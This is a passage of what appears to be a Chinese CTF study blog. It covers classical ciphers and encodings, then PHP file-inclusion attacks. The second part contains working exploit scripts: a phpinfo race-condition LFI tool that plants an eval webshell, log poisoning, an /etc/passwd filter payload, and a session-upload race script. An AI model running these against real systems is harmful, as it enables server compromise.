棋盘密码(Polybius,ADFGX,ADFGVX)\n\n\n波利比奥斯方阵密码\n\n例如“hello”用棋盘密码加密后变成“2315313134”。实际应用中，方阵中的字母顺序会被打乱，然后分发给信息发送方和接收方，增加第三方破解难度。\n\n特点：\n明文只能是字母；\n密文全部为数字；\n密文长度是明文的两倍，即偶数；\n明文字母I和J的密文编码相同，解密后需人工确认。\n\n![](/img/summary/misc/bolibiao.png)\n\n\n---\n\n第一次世界大战中德军发明了ADFGX棋盘密码，它是Polybius棋盘密码的改良版本，以适应当时的电报信息加密传送。ADFGX密码将Polybius棋盘中的12345替换成ADFGX，因此密文由数字变成了字母。然后使用一个密钥将密文再次移位加密，得到最终密文。\n\n![](/img/summary/misc/adfgx.png)\n\n---\n\n它是ADFGX棋盘的加强版本，增加了一个行列，用V表示。如此形成6行6列的棋盘，容纳26个字母、10个数字，总计36个字符。加密强度更高，且解密时不再刻意区分I和J\n\n这个密码以使用于密文当中的六个字母A、D、F、G、V、X命名\n\n![](/img/summary/misc/adfgvx.png)\n\n[解密脚本](https://www.cnblogs.com/folio/p/18146847)\n\n```python\ndef adfgvx_plus_decode(cp: str, kw: str, km: str) -> str:\n    \"\"\"\n        cp:cipher     密文\n        kw:keyword    密码\n        km:keymap     键盘布局\n    \"\"\"\n    keyword = kw.lower()\n    cipher = cp.lower()\n    klen = len(keyword)\n    clen = len(cipher) // klen\n    ncol = len(cipher) % klen\n    #print(len(cipher),klen,clen,ncol)\n\n    cols = [''] * klen\n    i = j = k = 0\n    while i < klen:\n        try:  # js: string.charAt(j)\n            c = 'abcdefghijklmnopqrstuvwxyz'[j]\n        except:\n            c = ''\n        t = keyword.find(c)  # js: string.indexOf(c)\n        if t >= 0:\n            col = clen + (1 if t < ncol else 0)\n            cols[t] = cipher[k:k + col]\n            k += col\n            atmp = list(keyword)\n            atmp[t] = '_'\n            keyword = ''.join(atmp)\n            i += 1\n        else:\n            j += 1\n        #print(i,j,k,t,cols,keyword)\n\n    s = ''\n    for i in range(clen + 1):\n        for j in range(klen):\n            try:  # js: string.charAt(j)\n                s += cols[j][i]\n            except:\n                pass\n            #print(s)\n\n    a = 'adfgvx'\n    return ''.join([km[a.find(s[i]) * 6 + a.find(s[i + 1])] for i in range(0, len(s), 2)])\n\n\ns = [['P', 'H', '0', 'Q', 'G', '6'],\n     ['4', 'M', 'E', 'A', '1', 'Y'],\n     ['L', '2', 'N', 'O', 'F', 'D'],\n     ['X', 'K', 'R', '3', 'C', 'V'],\n     ['S', '5', 'Z', 'W', '7', 'B'],\n     ['J', '9', 'U', 'T', 'I', '8']]\nkeymap = ''.join([s[i][j] for i in range(6) for j in range(6)])\nkeyword = 'Yusayyds'\ncipher = 'AGAXXDAGGVGGVDVADAVXDGADVGDVAADDDDFXAFAFDGDVXXDGGDGGDXDDFDDXVGXADGVDFXVVAADDXDXXADDVGGGXGXXXXGXXGGXGDVVVGGGAGAAAAGAAGGAGDDDAGAGGGAGGAGAGAAAVAAAXGXGGGXGGXGXGXXXV'\nflag = adfgvx_plus_decode(cipher, keyword, keymap)\nfor i in range(0, len(flag), 2):\n    print(chr(int(flag[i:i + 2], 16)), end='')\n```\n\n\n\n## 1.19. serpent\n\nSerpent是一种对称式分组加密算法，是高级加密标准（AES）的候选者之一，其顺序仅次于Rijndael算法。设计者为罗斯·安德森、艾力·毕汉姆及拉尔斯·克努森。\n\n与其他进入AES评选名单的算法一样，Serpent的区块长度为128比特，支持的密钥长度为128、192和256比特。\n\n[在线加解密](http://serpent.online-domain-tools.com/)\n\n\n## 1.20. piet\n\n与Whitespace，JSFuck等类似，是一种编程语言，不过这个语言的程序是点阵图\n\n可以使用[在线解释器](https://www.bertnase.de/npiet/npiet-execute.php)\n\n还可以下载源代码npiet-1.3a-win32到本地，然后使用以下命令运行\n\n```bash\nnpiet.exe -tpic solved.png\n```\n\n\n特点：白底+很多彩色的小像素点组成的图片\n\n\n\n## 1.21. 当铺密码\n\n当前汉字有多少笔画出头，对应的明文就是数字几\n\n例子:\n```txt\n密文：王夫 井工 夫口 由中人 井中 夫夫 由中大\n对应：67 84 70 123 82 77 125\n```\n\n\n## 1.22. brainfuck\n\nBrainfuck是一种极小化的计算机语言，只使用8种特定的符号\n\n注意内存中也可能会藏有信息，例如2023年羊城杯的GIFuck\n\n[在线转换1](https://www.splitbrain.org/services/ook)，[在线转换2(可看内存)](https://www.dcode.fr/brainfuck-language)\n\n\n例子：\n```brainfuck\n+++++ +++++ [->++ +++++ +++<] >.<++ +[->+ ++<]> +++++ .<+++ +++++ [->--\n----- -<]>- -.<++ +++++ [->++ +++++ <]>++ +++++ +++++ +.<++ +++++ [->--\n----- <]>-- ----- ----- .<\n```\n\n## 1.23. BubbleBabble编码\n\n特征：五位小写字母一组，以`-`分割\n\n例子：`xipak-herek-serid-bapok-horek-syrox`\n\n[在线工具](http://www.hiencode.com/bubble.html)\n\n## 1.24. 阴阳怪气编码\n\n特征：`['就 这 ¿ ', '不 会 吧 ？ ']`\n\n[GitHub项目地址](https://github.com/mmdjiji/yygq.js)\n\n[在线编码解密](https://std.ac/yygq.js/)\n\n## 1.25. emoji-aes\n\n特征：都由表情符号组成\n\nemoji-aes实际上就是aes加密文本，用一个key当作偏移，在表情字典中对应\n\n[emoji-aes在线](https://dr0n1.github.io/emoji-aes/)\n\n\n## 1.26 codemoji\n\n特征是key和密文为表情符号\n\n[codemoji-encrypt](https://codemoji.miaotony.xyz/#/encrypt)\n[codemoji-cracker](https://codemoji.miaotony.xyz/cracker/)\n\n\n## 1.27 solfa-cipher\n\n音乐密码\n\n[solfa-cipher](https://solfa-co.de/)\n\n\n## 1.28 Code Decabit\n\n特征：由`+`和`-`组成，十位一组\n\n例如：\n```text\n+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-\n```\n\n[Code Decabit](https://www.dcode.fr/code-decabit)\n\n\n\n## 1.29 DNA编码\n\n\n特征：由`ACGT`组成\n\n加解密脚本\n```python\nmapping = {\n\n'AAA':'a',\n'AAC':'b',\n'AAG':'c',\n'AAT':'d',\n'ACA':'e',\n'ACC':'f',\n'ACG':'g',\n'ACT':'h',\n'AGA':'i',\n'AGC':'j',\n'AGG':'k',\n'AGT':'l',\n'ATA':'m',\n'ATC':'n',\n'ATG':'o',\n'ATT':'p',\n'CAA':'q',\n'CAC':'r',\n'CAG':'s',\n'CAT':'t',\n'CCA':'u',\n'CCC':'v',\n'CCG':'w',\n'CCT':'x',\n'CGA':'y',\n'CGC':'z',\n'CGG':'A',\n'CGT':'B',\n'CTA':'C',\n'CTC':'D',\n'CTG':'E',\n'CTT':'F',\n'GAA':'G',\n'GAC':'H',\n'GAG':'I',\n'GAT':'J',\n'GCA':'K',\n'GCC':'L',\n'GCG':'M',\n'GCT':'N',\n'GGA':'O',\n'GGC':'P',\n'GGG':'Q',\n'GGT':'R',\n'GTA':'S',\n'GTC':'T',\n'GTG':'U',\n'GTT':'V',\n'TAA':'W',\n'TAC':'X',\n'TAG':'Y',\n'TAT':'Z',\n'TCA':'1',\n'TCC':'2',\n'TCG':'3',\n'TCT':'4',\n'TGA':'5',\n'TGC':'6',\n'TGG':'7',\n'TGT':'8',\n'TTA':'9',\n'TTC':'0',\n'TTG':' ',\n'TTT':'.'\n\n\n}\n\n\nencode_string = 'OME'\n\ndecode_string = 'GGAGCGCTG'\n\ninverted_mapping = dict(zip(mapping.values(), mapping.keys()))\n\ndef decode_dna( decode_string ):\n\n    pieces = []\n    for i in range( 0, len(decode_string), 3 ):\n        piece =  decode_string[i:i+3]\n        ## pieces.append()\n        pieces.append( mapping[piece] )\n\n    return \"\".join(pieces)\n\ndef encode_dna(encode_string):\n    pieces = []\n    for i in encode_string:\n        piece =  inverted_mapping[i]\n        pieces.append(piece)\n    return \"\".join(pieces)\n\nprint 'Decoded String is:- '+ decode_dna(decode_string)\nprint 'Encoded DNA String is:- '+ encode_dna(encode_string)\n```\n\n## 1.30. Gronsfeld\n\n格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别\n\n[在线解密](https://www.boxentriq.com/code-breaking/gronsfeld-cipher)\n\n解密脚本\n\n```python\nfrom pycipher import Gronsfeld\n\ncipher = 'TGLBOMSJNSRAJAZDEZXGHSJNZWHG'\nkey = [1,50,61,8,9,20,63,41]\nsecret = Gronsfeld(key).decipher(cipher)\n\nprint(secret)\n```\n\n## 1.31. 仿射密码(Affine)\n\n例子\n\n```text\ngezx{j13p5oznp_1t_z_900y_k3z771h_k001}\n密钥：a=17 b=77\nflag{w13e5hake_1s_a_900d_t3a771c_t001}\n```\n\n特点：有两个密钥ab(a是1,3,5,7,9,11,15,17,19,21,23,25中的一个)\n\n[在线解密](http://www.hiencode.com/affine.html)/CyberChef也可解\n\n\n\n## 1.32. 希尔密码(hill)\n\n希尔密码，是使用基本矩阵论原理的替换密码，现多用于古典密码教学学习。\n希尔密码，把每个字母当作26进制数字：A=0, B=1, C=2...，Z=25， 并把原文字母转换成数字，形成N维向量，跟一个n×n的密钥矩阵相乘，再将计算出的结果模26，即可得到加密密文。\n用作加密的密钥（即矩阵）必须是可逆的，否则就不可能解密，只有矩阵的行列式和26互质，才是可逆的。\n\n\n例子\n\n```text\n密文：ymyvzjtxswwktetpyvpfmvcdgywktetpyvpfuedfnzdjsiujvpwktetpyvnzdjpfkjssvacdgywktetpyvnzdjqtincduedfpfkjssne\n密钥：3 4 19 11\n```\n\n特点：密钥是四个数字\n\n\n[在线网站](http://www.metools.info/code/hillcipher243.html)\n\n\n## 1.33. 云影密码\n\n\n原理：以0作为分隔符分组，然后把每组数字相加得到一个数字，这个数字对应的就是26字母中的下标\n\n\n特点：密文只由01248组成\n\n解密脚本\n\n```python\nciphey = \"8842101220480224404014224202480122\"\nenc_list = ciphey.split('0')\nres = []\nprint(enc_list)\nfor item in enc_list:\n    sum = 0\n    for num in item:\n        sum += int(num)\n    res.append(chr(sum + 64))\nprint(''.join(res))\n```\n\n\n\n## 1.34. 维吉尼亚(vigenere)密码\n\n\n1、有密文和密钥：\n\n直接用cyberchef或者[在线网站](https://ctf.bugku.com/tool/vigenere)解密\n\n\n2、有密文，没有密钥：\n\n尝试用[在线网站](https://www.guballa.de/vigenere-solver)爆破\n\n\n3、有密文，没有密钥，但是知道明文的前几位：\n\n根据对照表，手搓密钥的前几位，找规律\n\n\n4、给了密钥字典，用脚本爆破\n\n```python\nfrom pycipher import Vigenere\n\ncipher = \"rla xymijgpf ppsoto wq u nncwel ff tfqlgnxwzz sgnlwduzmy vcyg ib bhfbe u tnaxua ff satzmpibf vszqen eyvlatq cnzhk dk hfy mnciuzj ou s yygusfp bl dq e okcvpa hmsz vi wdimyfqqjqubzc hmpmbgxifbgi qs lciyaktb jf clntkspy drywuz wucfm\"\n\nwith open(\"keys.txt\",\"r\") as f:\n    lines = f.readlines()\n\nfor line in lines:\n    key = line.strip()\n    res = Vigenere(key).decipher(cipher)\n    if \"PASSWORD\" in res:\n        print(f\"[+] key: {key}\")\n        print(f\"[+] res: {res.lower()}\")\n```\n\n## 1.35 博多码(Baudot Code)\n\n博多码是一种5位编码系统，通常用于电报通信。它有两种模式：字母移位（Letters Shift）和数字移位（Figures Shift），通过特殊的控制字符来切换模式。例如，当遇到特定的移位码时，后续的编码会切换到另一种模式，直到再次切换回来\n\n主要特点是字符用5比特编码，采用两个字符集\n\n解码脚本\n\n```python\nletters = {\n    '00000': '', '00001': 'E', '00010': '', '00011': 'A', '00100': ' ',\n    '00101': 'S', '00110': 'I', '00111': 'U', '01000': '', '01001': 'D',\n    '01010': 'R', '01011': 'J', '01100': 'N', '01101': 'F', '01110': 'C',\n    '01111': 'K', '10000': 'T', '10001': 'Z', '10010': 'L', '10011': 'W',\n    '10100': 'H', '10101': 'Y', '10110': 'P', '10111': 'Q', '11000': 'O',\n    '11001': 'B', '11010': 'G', '11011': '', '11100': 'M', '11101': 'X',\n    '11110': 'V', '11111': ''\n}\n\nfigures = {\n    '00000': '', '00001': '3', '00010': '', '00011': '-', '00100': ' ',\n    '00101': '', '00110': '8', '00111': '7', '01000': '', '01001': '$',\n    '01010': '4', '01011': \"'\", '01100': ',', '01101': '!', '01110': ':',\n    '01111': '(', '10000': '5', '10001': '\"', '10010': ')', '10011': '2',\n    '10100': '#', '10101': '6', '10110': '0', '10111': '1', '11000': '9',\n    '11001': '?', '11010': '&', '11011': '', '11100': '.', '11101': '/',\n    '11110': ';', '11111': ''\n}\n\n# 分割二进制序列为5位一组\nbinary_groups = \"001000011010000001001001100011001010010000011001001101110000000111111111001001101000000100011101100001001000010010010000101000001110000001001100100001011100001111100000010010001111011001100010011011000010000011001010010010000101000000100100001100110010000000010101001100000111000000110110000110000011100100010010000000011001000001110100101000011101101010000100000111001010110101000001111001000011000000100011001100000100110111011111111001001101101111111110011010000000111101110111100101110011111001000010111100000110101010000001001010111000001110010010100000111111000001001000110111000001110110001001001001000010100001100010100100101101001000011011100000100100000110110001001001001000010100000010010001101100100001111010001000011000101001000101100111110111000011111100001101100011111110001111011000111111101101110111011111111111100000111011101011111100110100001101100011110001111100011111000000100010\"\ngroups = [binary_groups[i:i+5] for i in range(0, len(binary_groups), 5)]\n\ncurrent_mode = 'letters'\nresult = []\n\nfor code in groups:\n    if current_mode == 'letters':\n        if code == '11011':  # 遇到FS切换到数字模式\n            current_mode = 'figures'\n            continue\n        elif code == '11111':  # LS无需处理\n            continue\n        result.append(letters[code])\n    elif current_mode == 'figures':\n        if code == '11111':  # 遇到LS切换回字母模式\n            current_mode = 'letters'\n            continue\n        result.append(figures[code])\n\ndecoded = ''.join(result).lower()\nprint(decoded)\n```\n\n\n\n\n# 图形密码\n\n这一部分较简单，对着表翻译就好，但也比较抽象，因为时常会出现奇奇怪怪的东西\n\n\n## 2.1. 跳舞的小人\n\n找到了三种不同的表，将密文与表一一对应即可（好像出自福尔摩斯）\n\n![](/img/summary/misc/tiaowuren-1.png)\n\n![](/img/summary/misc/tiaowuren-2.png)\n\n![](/img/summary/misc/tiaowuren-3.png)\n\n\n## 2.2. 猪圈密码\n\n[猪圈密码在线转换](http://moersima.00cha.net/zhuquan.asp)\n\n![](/img/summary/misc/zhujuan.png)\n\n\n以下几张是变种猪圈\n\n![](/img/summary/misc/zhujuanbianzhong1.png)\n\n![](/img/summary/misc/zhujuanbianzhong2.png)\n\n![](/img/summary/misc/zhujuanbianzhong3.png)\n\n\n## 2.3. 圣堂武士密码\n\n圣堂武士密码其实也是变种猪圈，不过比较有名\n\n![](/img/summary/misc/shengtangwushi.jpg)\n\n\n## 2.4. 银河字母\n\n![](/img/summary/misc/yihezimu.jpg)\n\n\n\n## 2.5. 凹凸字体\n\n![](/img/summary/misc/aotu.jpg)\n\n\n## 2.6. 夏多密码（曲折密码）\n\n来源：作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码\n整个夏多密码由两部分组成，码表和旋转方向\n\n![](/img/summary/misc/xiaoduo1.png)\n\n![](/img/summary/misc/xiaoduo2.png)\n\n\n最后四个符号（1，2，3，4）可以出现在密文中的任意位置，它代表着在此之后的密文需要向什么方向旋转\n\n\n## 2.7. 古埃及象形文字\n\n![](/img/summary/misc/guaiji1.png)\n\n![](/img/summary/misc/guaiji2.png)\n\n\n## 2.8. 费兹象形文字\n\n![](/img/summary/misc/feizixaingxingwenzi.png)\n\n\n## 2.9. Flag Semaphore旗语\n\n![](/img/summary/misc/qiyu.png)\n\n\n## 2.10. 船用信号旗\n\n![](/img/summary/misc/chuanyongxinhaoqi.png)\n\n## 2.11. Dvorak键盘加密\n\n>利用两种键盘字母的排列顺序不同，进行的一种替换加密方式。\n\nDvorak键盘，中文名字是德沃夏克键盘，由奥古斯特·德沃夏克和威廉·迪利在1930年代期间设计\n\n![](/img/summary/misc/Dvorak.png)\n\n![](/img/summary/misc/QWERTY.png)\n\n\n\n\n## other\n\n各种奇奇怪怪又抽象的实在太多了，可以参考下面两篇文章中的字符表\nhttps://www.cnblogs.com/Nuy0ah/p/16138118.html\nhttps://www.bilibili.com/read/cv19369626/\n\n部分脚本参考：[CTF-Misc Guide](https://goodlunatic.github.io/posts/1ad9200/)","tags":["总结","misc","编码","密码"],"categories":["总结"]},{"title":"任意文件包含/读取总结","url":"/posts/a3faee7a/","content":"\n\n# 常见利用函数\n\n\n```text\ninclude： 找不到被包含的文件时只会产生警告，脚本将继续执行。\ninclude_once： 和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。\nrequire： 找不到被包含的文件时会产生致命错误，并停止脚本。\nrequire_once： 和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。\n\nreadfile：返回从文件中读入的字节数\nfile_get_contents：把整个文件读入一个字符串中\n```\n\n\n\n# LFI/RFI\n\n>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。\n>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。\n\n\n远程文件包含（Remote File Inclusion， RFI）是指包含远程服务器上的文件，需要在`php.ini`中设置`allow_url_include=On`\n\n远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。\n\n如果对ip过滤了点可以将`ip`转为`int`\n\n![](/img/summary/file_include-4.png)\n\n\n\n\n# 伪协议\n\n[官网伪协议手册](https://www.php.net/manual/zh/wrappers.php)\n\n## file://协议\n\n`file://`用于访问本地文件系统\n\n使用条件：`allow_url_fopen=On/Off、allow_url_include=On/Off`\n\n\n![example](/img/summary/file_include-1.png)\n\n>trick: 可以用localhost代替/\n\n## php://协议\n### php://filter\n\n使用条件：`allow_url_fopen=On/Off、allow_url_include=On/Off`\n\n![example](/img/summary/file_include-2.png)\n\n![](/img/summary/file_include-5.png)\n\n\n#### php://filter绕过死亡die\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$file = $_GET['file'];\n$content = $_POST['content'];\n\nfile_put_contents($file,\"<?php die();?>\".$content);\n?>\n```\n\n使用`rot13`等转换器进行编码\n\n![example](../../img/summary/file_include-6.png)\n\n\n\n### php://input\n\n使用条件：`allow_url_fopen=On/Off、allow_url_include=On`\n\n`enctype=\"multipart/form-data\"`(即文件上传)的时候`php://input`是无效的。\n\n![example](../../img/summary/file_include-3.png)\n\n\n\n\n## data://协议\n\n使用条件：`allow_url_include=On、allow_url_fopen=On`\n\n利用data://伪协议进行代码执行的思路原理和php://input是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。\n\n用大白话解释就是说原来include包含的是一个路径，再去读取里面的内容，data://协议就相当于两步转为一步，直接读内容，可以理解为将include转为eval\n\n用法：`data://text/plain;base64,`\n\ntrick：符合[rfc2397](http://www.faqs.org/rfcs/rfc2397.html)规范即可\n\n![example](../../img/summary/file_include-7.png)\n\n\n\n# Nginx日志包含\n\n利用条件：\n1：有文件名可控的文件包含点\n2：有可以访问到的日志路径\n\nlinux下日志默认存储位置\n\n```text\n/var/log/nginx/access.log\n/var/log/nginx/error_log\n```\n\n在访问时修改`User-Agent`头为`php`代码，成功访问后会在日志中记录下来\n\n![](/img/summary/file_include-8.png)\n\n\n![](/img/summary/file_include-9.png)\n\n\n然后包含日志`?file=../../../../../var/log/nginx/access.log`，达到任意代码执行的效果\n\n\n# 临时文件包含\n\n在给`PHP`发送`POST`数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，`PHP`都会将这个文件保存成一个临时文件（通常是`/tmp/php[6个随机字符]`），文件名可以在`$_FILES`变量中找到。这个临时文件，在请求结束后就会被删除。\n\n同时，因为`phpinfo`页面会将当前请求上下文中所有变量都打印出来，所以我们如果向`phpinfo`页面发送包含文件区块的数据包，则即可在返回包里找到`$_FILES`变量的内容，自然也包含临时文件名。\n\n![](/img/summary/file_include-10.png)\n\n在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。\n\n但文件包含漏洞和`phpinfo`页面通常是两个页面，理论上我们需要先发送数据包给`phpinfo`页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行`getshell`。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。\n\n这个时候就需要用到条件竞争，具体流程如下：\n\n1：发送包含了`webshell`的上传数据包给`phpinfo`页面，这个数据包的`header`、`get`等位置需要塞满垃圾数据\n2：因为`phpinfo`页面会将所有数据都打印出来，1中的垃圾数据会将整个`phpinfo`页面撑得非常大\n3：`php`默认的输出缓冲区大小为`4096`，可以理解为`php`每次返回`4096`个字节给`socket`连接\n4：所以，我们直接操作原生`socket`，每次读取`4096`个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包\n5：此时，第一个数据包的`socket`连接实际上还没结束，因为`php`还在继续每次输出`4096`个字节，所以临时文件此时还没有删除\n6：利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终`getshell`\n\n\n脚本\n```python\n#!/usr/bin/python\n# python2 exp.py your-ip 8080 100\nimport sys\nimport threading\nimport socket\n\ndef setup(host, port):\n    TAG=\"Security Test\"\n    PAYLOAD=\"\"\"%s\\r\n<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\\r\"\"\" % TAG\n    REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\r\nContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r\nContent-Type: text/plain\\r\n\\r\n%s\n-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD\n    padding=\"A\" * 5000\n    REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\r\nCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\r\nHTTP_ACCEPT: \"\"\" + padding + \"\"\"\\r\nHTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\r\nHTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\r\nHTTP_PRAGMA: \"\"\"+padding+\"\"\"\\r\nContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r\nContent-Length: %s\\r\nHost: %s\\r\n\\r\n%s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA)\n    #modify this to suit the LFI script\n    LFIREQ=\"\"\"GET /lfi.php?file=%s HTTP/1.1\\r\nUser-Agent: Mozilla/4.0\\r\nProxy-Connection: Keep-Alive\\r\nHost: %s\\r\n\\r\n\\r\n\"\"\"\n    return (REQ1, TAG, LFIREQ)\n\ndef phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    s.connect((host, port))\n    s2.connect((host, port))\n\n    s.send(phpinforeq)\n    d = \"\"\n    while len(d) < offset:\n        d += s.recv(offset)\n    try:\n        i = d.index(\"[tmp_name] =&gt; \")\n        fn = d[i+17:i+31]\n    except ValueError:\n        return None\n\n    s2.send(lfireq % (fn, host))\n    d = s2.recv(4096)\n    s.close()\n    s2.close()\n\n    if d.find(tag) != -1:\n        return fn\n\ncounter=0\nclass ThreadWorker(threading.Thread):\n    def __init__(self, e, l, m, *args):\n        threading.Thread.__init__(self)\n        self.event = e\n        self.lock =  l\n        self.maxattempts = m\n        self.args = args\n\n    def run(self):\n        global counter\n        while not self.event.is_set():\n            with self.lock:\n                if counter >= self.maxattempts:\n                    return\n                counter+=1\n\n            try:\n                x = phpInfoLFI(*self.args)\n                if self.event.is_set():\n                    break\n                if x:\n                    print \"\\nGot it! Shell created in /tmp/g\"\n                    self.event.set()\n\n            except socket.error:\n                return\n\n\ndef getOffset(host, port, phpinforeq):\n    \"\"\"Gets offset of tmp_name in the php output\"\"\"\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host,port))\n    s.send(phpinforeq)\n\n    d = \"\"\n    while True:\n        i = s.recv(4096)\n        d+=i\n        if i == \"\":\n            break\n        # detect the final chunk\n        if i.endswith(\"0\\r\\n\\r\\n\"):\n            break\n    s.close()\n    i = d.find(\"[tmp_name] =&gt; \")\n    if i == -1:\n        raise ValueError(\"No php tmp_name in phpinfo output\")\n\n    print \"found %s at %i\" % (d[i:i+10],i)\n    # padded up a bit\n    return i+256\n\ndef main():\n\n    print \"LFI With PHPInfo()\"\n    print \"-=\" * 30\n\n    if len(sys.argv) < 2:\n        print \"Usage: %s host [port] [threads]\" % sys.argv[0]\n        sys.exit(1)\n\n    try:\n        host = socket.gethostbyname(sys.argv[1])\n    except socket.error, e:\n        print \"Error with hostname %s: %s\" % (sys.argv[1], e)\n        sys.exit(1)\n\n    port=80\n    try:\n        port = int(sys.argv[2])\n    except IndexError:\n        pass\n    except ValueError, e:\n        print \"Error with port %d: %s\" % (sys.argv[2], e)\n        sys.exit(1)\n\n    poolsz=10\n    try:\n        poolsz = int(sys.argv[3])\n    except IndexError:\n        pass\n    except ValueError, e:\n        print \"Error with poolsz %d: %s\" % (sys.argv[3], e)\n        sys.exit(1)\n\n    print \"Getting initial offset...\",\n    reqphp, tag, reqlfi = setup(host, port)\n    offset = getOffset(host, port, reqphp)\n    sys.stdout.flush()\n\n    maxattempts = 1000\n    e = threading.Event()\n    l = threading.Lock()\n\n    print \"Spawning worker pool (%d)...\" % poolsz\n    sys.stdout.flush()\n\n    tp = []\n    for i in range(0,poolsz):\n        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))\n\n    for t in tp:\n        t.start()\n    try:\n        while not e.wait(1):\n            if e.is_set():\n                break\n            with l:\n                sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts))\n                sys.stdout.flush()\n                if counter >= maxattempts:\n                    break\n        print\n        if e.is_set():\n            print \"Woot!  \\m/\"\n        else:\n            print \":(\"\n    except KeyboardInterrupt:\n        print \"\\nTelling threads to shutdown...\"\n        e.set()\n\n    print \"Shuttin' down...\"\n    for t in tp:\n        t.join()\n\nif __name__==\"__main__\":\n    main()\n```\n\n\n# php7.0文件包含崩溃卡临时文件\n\n>上面所说的临时文件包含是在**脚本运行结束之前**进行利用，而下面的方法则是在**脚本运行结束之后**利用\n\n7.0线程崩溃payload\n\n```php\nphp://filter/string.strip_tags/resource=/etc/passwd\n```\n\n上传表单的时候让php崩溃，从而保留下临时文件\n因为php是多线程的，所以单个线程的崩溃不会影响整个程序\n\n```python\nimport requests\n\nurl = \"https://eae07757-1a87-40c5-955d-58ec51004989.challenge.ctf.show/?file=php://filter/string.strip_tags/resource=/etc/passwd\"\ndata = [\n    ('file', ('a.php', \"@<?php\\r\\neval(\\x24_POST['a']);\\r\\necho 123;\\r\\n?>\", 'application/octet-stream'))]\n\nrequests.post(url, files=data)\n```\n\n\n# session.upload_progress文件包含\n\n会话机制(session)在PHP中用于保持用户连续访问Web应用时的相关数据。\n\n`PHP`将`session`以文件的形式存储在服务器某个文件中，可以在`php.ini`里面设置`session`的存储位置`session.save_path`\n\n默认路径\n\n```text\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sessions/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\n```\n\n\n再看下在`php.ini`中关于`session`和`upload_progress`的几个默认配置\n\n```php\nsession.upload_progress.enabled = on\nsession.upload_progress.cleanup = on\nsession.upload_progress.prefix = \"upload_progress_\"\nsession.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"\nsession.upload_progress.freq = \"1%\"\nsession.upload_progress.min_freq = \"1\"\nsession.use_strict_mode = \"0\"\n```\n\n\n>enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中；\n>cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容；\n>name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；\n>prefix+name将表示为session中的键名;\n\n\n其中`session.use_strict_mode`默认值为`0`，此时用户是可以自己定义`Session ID`的，比如在`Cookie`里设置`PHPSESSID=lewiserii`，`PHP`将会在服务器上创建一个文件：`/tmp/sess_lewiserii`\n\n然后在`PHP_SESSION_UPLOAD_PROGRESS`下添加一句话木马，这样就会往指定的`session`文件中写入我们想要的内容\n\n![](/img/summary/file_include-11.png)\n\n然后`?file=/tmp/sess_lewiserii`包含即可\n\n但是要注意`session.upload_progress.cleanup`默认是开启的，一旦读取了所有POST数据，它就会清空对应session文件中的内容，所以需要利用条件竞争来包含\n\n使用bp同时不断的发post传文件的包和文件包含的包或者使用脚本\n\n```python\nimport io\nimport sys\nimport requests\nimport threading\n\nsessid = 'ctf'\nsess_path='/tmp'\nurl='http://c0648e39-a4bb-4776-88f0-a5cf98e9f640.challenge.ctf.show/'\ncmd='ls /'\n\ndef WRITE(session):\n    while True:\n        f = io.BytesIO(b'x' * 1024 * 50)\n        session.post(\n            url=url,\n            data={\"PHP_SESSION_UPLOAD_PROGRESS\":f\"<?php system('{cmd}');?>\"},\n            files={\"file\":('xxx.txt', f)},\n            cookies={'PHPSESSID':sessid}\n        